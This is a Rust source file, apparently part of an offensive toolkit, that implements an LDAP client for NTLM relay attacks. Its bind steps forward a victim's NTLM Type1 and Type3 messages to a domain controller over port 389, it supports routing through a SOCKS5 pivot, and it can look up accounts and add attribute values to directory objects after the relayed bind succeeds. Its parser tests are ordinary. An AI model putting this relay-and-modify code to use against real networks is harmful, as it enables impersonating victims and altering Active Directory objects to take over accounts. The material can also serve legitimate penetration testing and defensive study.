//! Size-limited raw LDAP client for discrete NTLM relay SASL steps over port 389.
//!
//! NTLM **relay** requires discrete bind steps (`sasl_step1`/`sasl_step2`) so a relay server can
//! forward a victim's Type1/Type3. Direct credential authentication is refused because this
//! minimal client does not implement the required post-bind SASL integrity layer.

use anyhow::{anyhow, bail, Context, Result};
use smb2_client::spnego;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

const LDAP_CONNECT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);
const LDAP_IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
const MAX_LDAP_MESSAGE_BYTES: usize = 16 * 1024 * 1024;
const MAX_BER_LENGTH_OCTETS: usize = 4;

// ---- BER encoding (definite length) ---------------------------------------

fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        vec![n as u8]
    } else {
        let mut body = Vec::new();
        let mut v = n;
        while v > 0 {
            body.insert(0, (v & 0xff) as u8);
            v >>= 8;
        }
        let mut out = vec![0x80 | body.len() as u8];
        out.extend(body);
        out
    }
}

fn tlv(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend(der_len(value.len()));
    out.extend_from_slice(value);
    out
}

fn seq(children: &[Vec<u8>]) -> Vec<u8> {
    tlv(0x30, &children.concat())
}
fn octet(b: &[u8]) -> Vec<u8> {
    tlv(0x04, b)
}
fn integer(v: i64) -> Vec<u8> {
    // minimal two's-complement, at least one byte
    let mut bytes = v.to_be_bytes().to_vec();
    while bytes.len() > 1
        && ((bytes[0] == 0 && bytes[1] & 0x80 == 0) || (bytes[0] == 0xff && bytes[1] & 0x80 != 0))
    {
        bytes.remove(0);
    }
    tlv(0x02, &bytes)
}
fn enumerated(v: i64) -> Vec<u8> {
    let e = integer(v);
    tlv(0x0a, &e[e.len() - 1..]) // reuse the single content byte
}
fn boolean(b: bool) -> Vec<u8> {
    tlv(0x01, &[if b { 0xff } else { 0x00 }])
}

// ---- BER decoding ---------------------------------------------------------

/// Read one TLV at `pos`; return (tag, content_start, length, next_pos).
fn read_tlv(buf: &[u8], pos: usize) -> Result<(u8, usize, usize, usize)> {
    let tag = *buf.get(pos).ok_or_else(|| anyhow!("BER: truncated tag"))?;
    let b0 = *buf
        .get(pos + 1)
        .ok_or_else(|| anyhow!("BER: truncated length"))?;
    let (len, hdr) = if b0 & 0x80 == 0 {
        (b0 as usize, 2)
    } else {
        let n = (b0 & 0x7f) as usize;
        if n == 0 {
            bail!("BER: indefinite lengths are not accepted");
        }
        if n > MAX_BER_LENGTH_OCTETS || n > std::mem::size_of::<usize>() {
            return Err(anyhow!("BER: length field too large ({n} bytes)"));
        }
        let mut l = 0usize;
        for i in 0..n {
            let byte = *buf
                .get(pos + 2 + i)
                .ok_or_else(|| anyhow!("BER: truncated length"))?;
            if i == 0 && byte == 0 {
                bail!("BER: non-canonical length with leading zero");
            }
            l = l
                .checked_mul(256)
                .and_then(|v| v.checked_add(byte as usize))
                .ok_or_else(|| anyhow!("BER: length overflow"))?;
        }
        if l < 0x80 {
            bail!("BER: non-canonical long-form length");
        }
        (l, 2 + n)
    };
    let content = pos
        .checked_add(hdr)
        .ok_or_else(|| anyhow!("BER: header offset overflow"))?;
    let end = content
        .checked_add(len)
        .ok_or_else(|| anyhow!("BER: length overflow"))?;
    if end > buf.len() {
        bail!("BER: value escapes input (end {end}, input {})", buf.len());
    }
    Ok((tag, content, len, end))
}

fn read_tlv_in(buf: &[u8], pos: usize, parent_end: usize) -> Result<(u8, usize, usize, usize)> {
    if parent_end > buf.len() || pos >= parent_end {
        bail!("BER: child starts outside parent");
    }
    let tlv = read_tlv(buf, pos)?;
    if tlv.3 > parent_end {
        bail!("BER: child value escapes parent");
    }
    Ok(tlv)
}

fn parse_nonnegative_i64(buf: &[u8], start: usize, len: usize) -> Result<i64> {
    if len == 0 || len > std::mem::size_of::<i64>() {
        bail!("BER: invalid integer width {len}");
    }
    let end = start
        .checked_add(len)
        .ok_or_else(|| anyhow!("BER: integer range overflow"))?;
    let value = buf
        .get(start..end)
        .ok_or_else(|| anyhow!("BER: integer escapes input"))?;
    Ok(value.iter().fold(0i64, |a, &b| (a << 8) | b as i64))
}

// ---- LDAP client ----------------------------------------------------------

pub struct LdapClient {
    stream: TcpStream,
    msg_id: i64,
}

impl LdapClient {
    pub async fn connect(addr: &str) -> Result<Self> {
        // Split an optional explicit port so the connection can be routed through the global
        // SOCKS5 pivot (dial() falls back to a direct connect when no proxy is set).
        let (host, port) = match addr.rsplit_once(':') {
            Some((h, p)) if p.chars().all(|c| c.is_ascii_digit()) && !p.is_empty() => {
                (h, p.parse().unwrap_or(389))
            }
            _ => (addr, 389u16),
        };
        let stream =
            tokio::time::timeout(LDAP_CONNECT_TIMEOUT, smb2_client::socks::dial(host, port))
                .await
                .map_err(|_| {
                    anyhow!(
                        "ldap connect timed out after {}s",
                        LDAP_CONNECT_TIMEOUT.as_secs()
                    )
                })?
                .context("ldap connect")?;
        Ok(LdapClient { stream, msg_id: 0 })
    }

    /// Send an LDAPMessage wrapping `protocol_op` and read the next full LDAPMessage back.
    async fn exchange(&mut self, protocol_op: Vec<u8>) -> Result<Vec<u8>> {
        self.msg_id = self
            .msg_id
            .checked_add(1)
            .context("LDAP message ID exhausted")?;
        let msg = seq(&[integer(self.msg_id), protocol_op]);
        if msg.len() > MAX_LDAP_MESSAGE_BYTES {
            bail!("LDAP request exceeds {MAX_LDAP_MESSAGE_BYTES} byte limit");
        }
        tokio::time::timeout(LDAP_IO_TIMEOUT, async {
            self.stream.write_all(&msg).await?;
            let mut head = [0u8; 2];
            self.stream.read_exact(&mut head).await?;
            if head[0] != 0x30 {
                bail!("LDAP response is not an LDAPMessage sequence");
            }
            let mut prefix = vec![head[0], head[1]];
            let total = if head[1] & 0x80 == 0 {
                head[1] as usize
            } else {
                let n = (head[1] & 0x7f) as usize;
                if n == 0 {
                    bail!("LDAP response uses an indefinite BER length");
                }
                if n > MAX_BER_LENGTH_OCTETS || n > std::mem::size_of::<usize>() {
                    bail!("LDAP response length uses {n} octets");
                }
                let mut lb = vec![0u8; n];
                self.stream.read_exact(&mut lb).await?;
                if lb.first() == Some(&0) {
                    bail!("LDAP response uses a non-canonical BER length");
                }
                let mut total = 0usize;
                for b in &lb {
                    total = total
                        .checked_mul(256)
                        .and_then(|v| v.checked_add(*b as usize))
                        .context("LDAP response length overflow")?;
                }
                prefix.extend_from_slice(&lb);
                total
            };
            if total > MAX_LDAP_MESSAGE_BYTES {
                bail!("LDAP response body is {total} bytes; limit is {MAX_LDAP_MESSAGE_BYTES}");
            }
            let full_len = prefix
                .len()
                .checked_add(total)
                .context("LDAP response size overflow")?;
            if full_len > MAX_LDAP_MESSAGE_BYTES {
                bail!("LDAP response exceeds {MAX_LDAP_MESSAGE_BYTES} byte limit");
            }
            let mut body = vec![0u8; total];
            self.stream.read_exact(&mut body).await?;
            prefix.extend_from_slice(&body);
            Ok(prefix)
        })
        .await
        .map_err(|_| {
            anyhow!(
                "LDAP exchange timed out after {}s",
                LDAP_IO_TIMEOUT.as_secs()
            )
        })?
    }

    /// Send a SASL GSS-SPNEGO bind carrying `spnego_token`; return the bindResponse's
    /// (resultCode, serverSaslCreds).
    async fn sasl_bind(&mut self, spnego_token: &[u8]) -> Result<(i64, Vec<u8>)> {
        let sasl = tlv(0xa3, &[octet(b"GSS-SPNEGO"), octet(spnego_token)].concat()); // [3] SaslCredentials
        let bind_req = tlv(0x60, &[integer(3), octet(b""), sasl].concat()); // [APP 0] BindRequest
        let resp = self.exchange(bind_req).await?;
        // LDAPMessage: SEQ { msgID, [APP 1] BindResponse { resultCode ENUM, matchedDN, diag, [7] saslCreds? } }
        let (outer_tag, c, _, outer_end) = read_tlv(&resp, 0)?;
        if outer_tag != 0x30 || outer_end != resp.len() {
            bail!("BER: malformed LDAPMessage envelope");
        }
        let (_, _, _, after_id) = read_tlv_in(&resp, c, outer_end)?;
        let (bind_tag, bc, _, bind_end) = read_tlv_in(&resp, after_id, outer_end)?;
        if bind_tag != 0x61 {
            bail!("BER: expected BindResponse, got tag 0x{bind_tag:02x}");
        }
        let (result_tag, rc, rl, next) = read_tlv_in(&resp, bc, bind_end)?;
        if result_tag != 0x0a {
            bail!("BER: BindResponse resultCode is not ENUMERATED");
        }
        let result_code = parse_nonnegative_i64(&resp, rc, rl)?;
        // skip matchedDN, diagnosticMessage; look for [7] serverSaslCreds (context primitive 0x87)
        let mut p = next;
        let mut sasl_creds = Vec::new();
        while p < bind_end {
            let (t, cc, cl, nn) = read_tlv_in(&resp, p, bind_end)?;
            if t == 0x87 {
                sasl_creds = resp[cc..cc + cl].to_vec();
            }
            p = nn;
        }
        Ok((result_code, sasl_creds))
    }

    /// Bind step 1 for a relay: send the victim's Type1, return the server's Type2.
    pub async fn sasl_step1(&mut self, type1: &[u8]) -> Result<Vec<u8>> {
        let (_rc, creds) = self.sasl_bind(&spnego::negotiate_init(type1)).await?;
        spnego::find_ntlm(&creds)
            .map(|t| t.to_vec())
            .ok_or_else(|| anyhow!("no NTLM challenge in bindResponse"))
    }

    /// Bind step 2 for a relay: send the victim's Type3; Ok(()) iff the bind succeeded.
    pub async fn sasl_step2(&mut self, type3: &[u8]) -> Result<()> {
        let (rc, _) = self.sasl_bind(&spnego::negotiate_resp(type3)).await?;
        match rc {
            0 => Ok(()),
            8 => bail!(
                "resultCode 8 (strongAuthRequired) — auth OK but the DC enforces LDAP \
                        signing; use LDAPS, or this target isn't relayable to LDAP"
            ),
            49 => bail!("resultCode 49 (invalidCredentials)"),
            other => bail!("LDAP SASL bind failed: resultCode {other}"),
        }
    }

    /// Direct password authentication over LDAP-389 is intentionally refused: this client does
    /// not implement the post-bind SASL integrity layer. Relay callers continue to use the two
    /// discrete SASL steps because they do not possess the victim's exported session key.
    pub async fn bind_ntlm(
        &mut self,
        _domain: &str,
        _user: &str,
        _password: &str,
        _workstation: &str,
    ) -> Result<()> {
        bail!(
            "direct NTLM SASL over LDAP-389 is disabled because post-bind integrity is not implemented; use verified LDAPS"
        )
    }

    /// Search under `base` for `(sAMAccountName=sam)` and return the first entry's DN.
    pub async fn find_dn(&mut self, base: &str, sam: &str) -> Result<String> {
        // Filter: equalityMatch [3] { attributeDesc, assertionValue }
        let filter = tlv(
            0xa3,
            &[octet(b"sAMAccountName"), octet(sam.as_bytes())].concat(),
        );
        let req = tlv(
            0x63, // [APP 3] SearchRequest
            &[
                octet(base.as_bytes()),
                enumerated(2), // scope: wholeSubtree
                enumerated(0), // derefAliases: never
                integer(1),    // sizeLimit
                integer(0),    // timeLimit
                boolean(false),
                filter,
                seq(&[]), // attributes: none (DN only)
            ]
            .concat(),
        );
        let resp = self.exchange(req).await?;
        // Expect a SearchResultEntry [APP 4]; objectName is the first field (its DN).
        let (outer_tag, c, _, outer_end) = read_tlv(&resp, 0)?;
        if outer_tag != 0x30 || outer_end != resp.len() {
            bail!("BER: malformed LDAPMessage envelope");
        }
        let (_, _, _, after_id) = read_tlv_in(&resp, c, outer_end)?;
        let (t, ec, _el, entry_end) = read_tlv_in(&resp, after_id, outer_end)?;
        if t != 0x64 {
            bail!("no matching object for sAMAccountName={sam}");
        }
        let (dn_tag, dc, dl, _) = read_tlv_in(&resp, ec, entry_end)?;
        if dn_tag != 0x04 {
            bail!("BER: SearchResultEntry objectName is not an OCTET STRING");
        }
        Ok(String::from_utf8_lossy(&resp[dc..dc + dl]).into_owned())
    }

    /// ModifyRequest: add `value` to attribute `attr` on `dn` (op=add).
    pub async fn modify_add(&mut self, dn: &str, attr: &str, value: &[u8]) -> Result<()> {
        let partial = seq(&[octet(attr.as_bytes()), tlv(0x31, &octet(value))]); // { type, vals SET }
        let change = seq(&[enumerated(0), partial]); // { operation add(0), modification }
        let req = tlv(0x66, &[octet(dn.as_bytes()), seq(&[change])].concat()); // [APP 6] ModifyRequest
        let resp = self.exchange(req).await?;
        // ModifyResponse [APP 7] { resultCode ENUM ... }
        let (outer_tag, c, _, outer_end) = read_tlv(&resp, 0)?;
        if outer_tag != 0x30 || outer_end != resp.len() {
            bail!("BER: malformed LDAPMessage envelope");
        }
        let (_, _, _, after_id) = read_tlv_in(&resp, c, outer_end)?;
        let (modify_tag, mc2, _, modify_end) = read_tlv_in(&resp, after_id, outer_end)?;
        if modify_tag != 0x67 {
            bail!("BER: expected ModifyResponse, got tag 0x{modify_tag:02x}");
        }
        let (result_tag, rc, rl, _) = read_tlv_in(&resp, mc2, modify_end)?;
        if result_tag != 0x0a {
            bail!("BER: ModifyResponse resultCode is not ENUMERATED");
        }
        let code = parse_nonnegative_i64(&resp, rc, rl)?;
        if code != 0 {
            bail!("LDAP modify failed: resultCode {code}");
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ber_integer_is_minimal() {
        assert_eq!(integer(3), vec![0x02, 0x01, 0x03]);
        assert_eq!(integer(256), vec![0x02, 0x02, 0x01, 0x00]);
    }

    #[test]
    fn bind_request_shape() {
        // A SASL bind body should be [APP 0] with version 3 and the SASL [3] choice.
        let sasl = tlv(0xa3, &[octet(b"GSS-SPNEGO"), octet(b"tok")].concat());
        let body = tlv(0x60, &[integer(3), octet(b""), sasl].concat());
        assert_eq!(body[0], 0x60);
        // read back the version
        let (_, c, _, _) = read_tlv(&body, 0).unwrap();
        let (t, vc, _, _) = read_tlv(&body, c).unwrap();
        assert_eq!(t, 0x02);
        assert_eq!(body[vc], 3);
    }

    #[test]
    fn read_tlv_long_form() {
        let mut m = vec![0x04, 0x82, 0x01, 0x00]; // OCTET STRING, length 256
        m.extend(std::iter::repeat_n(0xAA, 256));
        let (tag, c, len, next) = read_tlv(&m, 0).unwrap();
        assert_eq!(tag, 0x04);
        assert_eq!(len, 256);
        assert_eq!(c, 4);
        assert_eq!(next, 260);
    }

    /// A crafted huge long-form length must be rejected without overflow.
    #[test]
    fn read_tlv_huge_length_no_overflow() {
        let m = [0x04, 0x88, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]; // 8-byte length = u64::MAX
        assert!(read_tlv(&m, 0).is_err());
    }

    #[test]
    fn read_tlv_rejects_truncated_and_noncanonical_values() {
        assert!(read_tlv(&[0x04, 0x02, 0xaa], 0).is_err());
        assert!(read_tlv(&[0x04, 0x80], 0).is_err());
        assert!(read_tlv(&[0x04, 0x81, 0x7f], 0).is_err());
        assert!(read_tlv(&[0x04, 0x82, 0x00, 0x80], 0).is_err());
    }

    #[test]
    fn child_tlv_cannot_escape_parent_container() {
        let envelope = [0x30, 0x03, 0x04, 0x05, 0xaa];
        let (_, content, _, end) = read_tlv(&envelope, 0).unwrap();
        assert!(read_tlv_in(&envelope, content, end).is_err());
    }

    /// Fuzz-lite: LDAP server responses are fully untrusted — `read_tlv` must never panic.
    #[test]
    fn fuzz_read_tlv_never_panics() {
        let mut s: u64 = 0x1DAB_5EED_9E37_79B9;
        let mut rng = || {
            s ^= s >> 12;
            s ^= s << 25;
            s ^= s >> 27;
            s.wrapping_mul(0x2545_F491_4F6C_DD1D)
        };
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {}));
        let mut fail = None;
        for _ in 0..200_000 {
            let n = rng() as usize % 64;
            let buf: Vec<u8> = (0..n).map(|_| rng() as u8).collect();
            let pos = rng() as usize % (buf.len() + 1);
            let (b, p) = (buf.clone(), pos);
            if std::panic::catch_unwind(|| {
                let _ = read_tlv(&b, p);
            })
            .is_err()
            {
                fail = Some((buf, pos));
                break;
            }
        }
        std::panic::set_hook(prev);
        if let Some((buf, pos)) = fail {
            panic!(
                "read_tlv panicked at pos {pos} on {}: {}",
                buf.len(),
                buf.iter().map(|x| format!("{x:02x}")).collect::<String>()
            );
        }
    }
}
